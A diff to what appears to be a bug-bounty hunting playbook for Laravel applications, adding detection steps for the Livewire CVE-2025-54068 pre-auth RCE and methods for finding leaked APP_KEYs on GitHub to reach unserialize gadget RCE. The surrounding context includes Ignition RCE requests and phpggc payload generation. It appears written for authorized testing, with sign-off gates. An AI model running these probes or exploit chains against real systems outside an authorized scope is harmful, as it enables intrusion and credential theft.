@@ -1,6 +1,6 @@
 ---
 name: hunt-laravel
-description: Hunt Laravel specific vulnerabilities — Debug mode leakage (APP_DEBUG=true exposes full stack trace + env vars), Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure. Use when target runs Laravel (PHP) — detected via X-Powered-By, Laravel session cookies, or /storage/ paths.
+description: Hunt Laravel specific vulnerabilities — Debug mode leakage (APP_DEBUG=true exposes full stack trace + env vars), Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Livewire v3 pre-auth RCE (CVE-2025-54068), APP_KEY leak to decrypt() unserialize RCE, Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure. Use when target runs Laravel (PHP) — detected via X-Powered-By, Laravel session cookies, or /storage/ paths.
 sources: hackerone_public, cve_database
 report_count: 14
 ---
@@ -16,7 +16,8 @@ Laravel debug mode enabled in production = instant RCE via Ignition (CVE-2021-31
 - **Telescope dashboard** — `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
 - **Horizon dashboard** — `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
 - **Signed URL manipulation** — if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
-- **.env exposure** — `APP_KEY` leaked → decrypt all encrypted cookies → forge session → ATO
+- **Livewire v3 (CVE-2025-54068)**: pre-auth RCE via `POST /livewire/update` on 3.0.0-beta.1 to 3.6.3; mass-exploited in 2026
+- **APP_KEY leak (.env, GitHub, reused public key)**: `decrypt()` unserializes → phpggc gadget → RCE (plus forged sessions → ATO)
 
 ---
 
@@ -35,6 +36,10 @@ done
 
 # Check error page (trigger 404)
 curl -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"
+
+# Livewire v3: script route, update endpoint, component snapshots (feeds Phase 2b)
+curl -s -o /dev/null -w "livewire.js: %{http_code}\n" "https://$TARGET/livewire/livewire.js"
+curl -s "https://$TARGET/login" | grep -oE 'livewire[.a-z]*\.js\?id=[^"]+|data-update-uri="[^"]+"|wire:snapshot' | sort -u
 ```
 
 ---
@@ -67,6 +72,26 @@ curl -s -X POST "https://$TARGET/_ignition/execute-solution" \
     }
   }'
 ```
+
+---
+
+## Phase 2b - Livewire v3 Pre-Auth RCE (CVE-2025-54068)
+
+Livewire `>= 3.0.0-beta.1, < 3.6.4` (fixed 3.6.4; v1/v2 not affected; CVSS v4 9.2). `POST /livewire/update` hydrates a synthesizer tuple hidden in a nested array inside `updates`, which sits outside the checksummed snapshot, so an unauthenticated request reaches PHP object instantiation. Needs a mounted component with a public property that is not strictly typed. Filament's `/admin/login` was a pre-auth example. In the wild: Imperva observed mass exploitation from 2026-05-24, 6,167 apps compromised and their `.env` credentials harvested.
+
+```bash
+# 1. Component pages: any page whose HTML carries wire:snapshot
+for p in / /login /register /admin/login; do
+  curl -s "https://$TARGET$p" | grep -q 'wire:snapshot' && echo "[+] Livewire component: $p"
+done
+# 2. Version gate: livewire.js?id=<hash> changes per release; Livepyre maps it to a version.
+#    Check mode only, no payload: https://github.com/synacktiv/Livepyre
+python3 Livepyre.py -u "https://$TARGET/login" -c
+```
+
+- Vulnerable version + mounted component = report on the version gate plus the `-c` output. Without `-c`, Livepyre sends `system('id')` by default: do not run it without Stage B sign-off.
+- `-a APP_KEY` mode signs a malicious snapshot and still works on 3.6.4+ (design issue, no CVE, unpatched upstream). A leaked APP_KEY on any Livewire v3 app is RCE regardless of version (Phase 4).
+- Sources: https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3 , https://www.synacktiv.com/en/publications/livewire-remote-command-execution-through-unmarshaling , https://www.imperva.com/blog/cve-2025-54068-laravel-livewire-credential-theft-campaign-6000-applications-compromised/
 
 ---
 
@@ -104,11 +129,23 @@ curl -s "https://$TARGET/.env.production"
 curl -s "https://$TARGET/.env.backup"
 curl -s "https://$TARGET/.env.local"
 
-# If APP_KEY found:
+# If APP_KEY found: grade as RCE, not just ATO. decrypt() calls unserialize() on the plaintext,
+# so a re-encrypted XSRF-TOKEN / cookie session reaches a phpggc gadget (Phase 7).
+#   CVE-2018-15133: Laravel <= 5.5.40 and 5.6.0-5.6.29, X-XSRF-TOKEN
+#   CVE-2024-55556: same class in Crater Invoice, laravel_session with SESSION_DRIVER=cookie
+#   Livewire v3: the key signs snapshots (Phase 2b), patched or not
 APP_KEY="base64:XXXXXXX"
-echo "APP_KEY=$APP_KEY"
-# → Can decrypt all Laravel encrypted cookies
-# → Can forge session cookies → ATO for any user
+# Confirm the key without a payload: decrypts the target's own XSRF-TOKEN / session cookies
+python3 laravel_crypto_killer.py check "https://$TARGET" "${APP_KEY#base64:}"   # github.com/synacktiv/laravel-crypto-killer
+
+# APP_KEY recovery from public leaks. GitGuardian + Synacktiv (Jul 2025): 260K keys exposed on
+# GitHub mapped to 600 vulnerable apps; keys deleted from repos often stay valid in prod.
+gh search code "APP_URL=https://$TARGET" --limit 100
+gh search code "$TARGET" --filename .env --limit 100
+# Also the org's repos + git history (deleted .env), Docker image layers, public CI logs.
+# Boilerplate key reuse: crypto-killer `bruteforce` mode tries bundled public-key wordlists
+# against a captured XSRF-TOKEN. Validate every candidate with `check` above.
+# https://blog.gitguardian.com/exploiting-public-app_key-leaks/
 
 # Also check
 curl -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "exception\|error\|key\|password"
@@ -191,7 +228,8 @@ php phpggc Laravel/RCE5 system 'id' | base64
 | Debug mode ON | CVE-2021-3129 Ignition RCE | Critical RCE |
 | Telescope accessible | Read API keys, DB queries, env vars | High - credential theft |
 | Horizon accessible | Read failed job payloads | High - PII/token exfil |
-| .env exposed with APP_KEY | Forge session cookie → ATO | Critical ATO |
+| Livewire v3 < 3.6.4 + mounted component | CVE-2025-54068 `/livewire/update` | Critical pre-auth RCE |
+| APP_KEY leaked (.env, GitHub, reused key) | `decrypt()` unserialize → phpggc gadget; Livewire snapshot signing; forged sessions | Critical RCE (ATO as fallback) |
 | Signed URL bypass | Unauthorized actions (unsubscribe any user, etc.) | Medium-High |
 | Mass assignment | Set is_admin=true → privilege escalation | Critical |
 
@@ -201,11 +239,13 @@ php phpggc Laravel/RCE5 system 'id' | base64
 
 ✅ Ignition RCE: `id` command output returned in response
 ✅ Telescope: API responses contain DB queries with credentials or user tokens
-✅ APP_KEY: Forged session cookie accepted, returns another user's profile
+✅ APP_KEY: `laravel_crypto_killer.py check` decrypts the target's cookies (key confirmed); gadget execution only under Stage B sign-off
+✅ Livewire: version < 3.6.4 from `livewire.js?id=` hash + `wire:snapshot` component + Livepyre `-c` positive
 ✅ Mass assignment: `is_admin: true` accepted, account now has admin privileges
 
 **Severity:**
 - Ignition RCE: Critical
 - Telescope/Horizon with sensitive data: High
-- .env with APP_KEY: Critical
+- APP_KEY leak (any source): Critical (RCE)
+- Livewire CVE-2025-54068: Critical
 - Mass assignment to admin: Critical
